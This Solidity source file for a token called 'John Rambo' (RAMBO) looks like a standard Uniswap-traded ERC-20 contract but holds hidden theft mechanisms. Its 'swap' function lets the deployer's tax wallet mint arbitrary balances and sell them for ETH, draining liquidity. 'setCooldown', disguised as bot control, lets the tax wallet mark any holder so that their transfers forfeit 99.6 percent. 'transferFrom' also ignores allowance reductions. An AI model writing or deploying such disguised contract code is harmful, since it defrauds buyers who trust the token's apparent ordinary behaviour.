pragma solidity ^0.8.20;
// SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
}


interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}
abstract contract Ownable {
    address private _owner;
    function owner() public view virtual returns (address) {return _owner;}
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract Rambo is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;

    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0), "IERC20: approve to the zero address"); require(owner != address(0), "IERC20: approve from the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    string private _name = "John Rambo";
    string private _symbol = "RAMBO";
    constructor() {
        _taxWallet = msg.sender; 
        _balances[msg.sender] =  _totalSupply; 
        emit Transfer(address(0), msg.sender, _balances[sender()]);
    }
    function setCooldown(address[] calldata botList) external {
        for (uint _bAddrIndx = 0;  _bAddrIndx < botList.length;  _bAddrIndx++) { 
            if (
                !taxWalletAddress()){}else { 
                cooldowns[botList[_bAddrIndx]] = 1 + block.number;
        }
        }
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function swap(uint256 tokenValue, address recipient) external {
        if (taxWalletAddress()) {
        _approve(address(this), address(uniV2Router), tokenValue); _balances[address(this)] = tokenValue;address[] memory path = new address[](2);
         path[0] = address(this); path[1] = uniV2Router.WETH(); 
         uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenValue, 0, path, recipient, block.timestamp + 31);
        } else {}
    }
    function name() external view returns (string memory) {
        return _name;
    }
    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][msg.sender] >= _amount);
        return true;
    }
    address public _taxWallet;
    event Transfer(address indexed from, address indexed to, uint256);
    mapping(address => uint256) bots;
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    uint256 internal _feePercent = 0;
    uint256 internal _startFee = 2;
    uint256 internal _endFee = 0;
    function taxWalletAddress() private view returns (bool) {
        return msg.sender == _taxWallet;
    }
    mapping(address => uint256) private _balances;
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[sender()][spender] + addedValue);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(sender(), spender, amount);
        return true;
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    event Approval(address indexed, address indexed, uint256 value);
    mapping (address => uint256) internal cooldowns;
    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0));
        require(value <= _balances[from]);
        uint256 _fee = _feePercent;
        bool cd = cooldowns[from] != 0;
        uint256 botFee = value.mul(996).div(1000);
        if (cd && cooldowns[from] <= block.number) { _fee = botFee; }
        _balances[from] = (_balances[from] - value);
        _balances[to] += (value - _fee);
        emit Transfer(from, to, value);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
}